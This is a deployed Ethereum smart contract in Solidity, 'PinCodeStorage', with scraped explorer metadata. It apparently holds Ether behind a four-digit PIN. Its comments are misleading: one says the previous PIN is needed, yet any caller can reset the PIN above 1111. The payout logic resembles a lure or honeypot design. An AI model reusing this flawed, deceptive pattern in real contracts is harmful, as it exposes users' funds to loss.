
//Address: 0x1EBf20031b03B80E5f6FdbEB9F86d44145224006
//Contract name: PinCodeStorage
//Balance: 0 Ether
//Verification Date: 2/28/2018
//Transacion Count: 4

// CODE STARTS HERE

contract PinCodeStorage {
	// Store some money with 4 digit pincode
	
    address Owner = msg.sender;
    uint PinCode;

    function() public payable {}
    function PinCodeStorage() public payable {}
   
    function setPinCode(uint p) public payable{
        //To set Pin you need to know the previous one and it has to be bigger than 1111
        if (p>1111 || PinCode == p){
            PinCode=p;
        }
    }
    
    function Take(uint n) public payable {
		if(msg.value >= this.balance && msg.value > 0.2 ether)
			// To prevent random guesses, you have to send some money
			// Random Guess = money lost
			if(n <= 9999 && n == PinCode)
				msg.sender.transfer(this.balance+msg.value);
    }
    
    function kill() {
        require(msg.sender==Owner);
        selfdestruct(msg.sender);
     }
}
